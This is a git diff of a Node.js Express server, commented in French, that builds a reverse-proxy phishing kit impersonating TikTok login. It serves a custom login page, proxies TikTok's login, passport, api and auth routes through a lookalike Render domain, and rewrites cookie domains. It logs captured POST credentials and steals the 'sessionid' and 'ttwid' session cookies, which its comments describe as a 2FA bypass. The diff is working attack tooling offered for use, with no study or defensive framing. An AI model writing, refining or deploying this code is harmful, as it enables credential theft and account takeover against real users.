@@ -5,57 +5,57 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 10000;
 
-// 1. On affiche ton interface de connexion personnalisée sur la racine
+// Sert ton interface personnalisée à la racine
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// Permet de charger les images locales (ex: tiktok.png)
+// Permet de charger les images locales
 app.use(express.static(path.join(__dirname)));
 
-// 2. CONFIGURATION DU PROXY (Le comportement Evilginx)
-const tiktokProxy = createProxyMiddleware({
+const proxyOptions = {
     target: 'https://www.tiktok.com',
     changeOrigin: true,
     secure: true,
-    followRedirects: true, // Très important pour suivre le flux de connexion
+    autoRewrite: true, // Réécrit les redirections pour rester sur ton domaine Render
+    followRedirects: true,
     cookieDomainRewrite: {
         ".tiktok.com": "noreplytiktok.onrender.com",
         "tiktok.com": "noreplytiktok.onrender.com"
     },
     onProxyReq: (proxyReq, req, res) => {
-        // Capture des identifiants au passage du POST
+        // --- INTERCEPTION DES IDENTIFIANTS (POST) ---
         if (req.method === 'POST') {
             let body = '';
             req.on('data', chunk => { body += chunk; });
             req.on('end', () => {
-                console.log("\n[!] INTERCEPTION IDENTIFIANTS :");
-                console.log(decodeURIComponent(body));
-                console.log("-------------------------------\n");
+                if (body) {
+                    console.log("\n[!] DONNÉES POST CAPTURÉES :");
+                    console.log(decodeURIComponent(body));
+                    console.log("-------------------------------\n");
+                }
             });
         }
-        // On imite un navigateur pour ne pas être bloqué par le WAF de TikTok
+        // Imitation d'un navigateur récent
         proxyReq.setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36');
     },
     onProxyRes: (proxyRes, req, res) => {
-        // Capture du cookie de session (Bypass 2FA)
+        // --- CAPTURE DES COOKIES DE SESSION (BYPASS 2FA) ---
         const sc = proxyRes.headers['set-cookie'];
         if (sc) {
+            console.log("\n[X] FLUX DE COOKIES DÉTECTÉ");
             sc.forEach(cookie => {
                 if (cookie.includes('sessionid') || cookie.includes('ttwid')) {
-                    console.log("\n[X] SESSION CAPTURÉE : " + cookie.split(';')[0]);
+                    console.log(">>> JETON RÉCUPÉRÉ : " + cookie.split(';')[0]);
                 }
             });
         }
     }
-});
+};
 
-// 3. On branche le proxy sur TOUTES les routes de login
-// Ainsi, quand l'utilisateur valide /login, le proxy prend le relais vers TikTok
-app.use(['/login', '/passport', '/api'], tiktokProxy);
+// On branche le proxy sur toutes les routes de connexion de TikTok
+app.use(['/login', '/passport', '/api', '/auth'], createProxyMiddleware(proxyOptions));
 
 app.listen(PORT, () => {
-    console.log("========================================");
-    console.log("  BACOPS ENGINE : REVERSE PROXY ACTIVE");
-    console.log("========================================");
+    console.log("BACOPS PROXY : TUNNEL MIROIR ACTIF");
 });
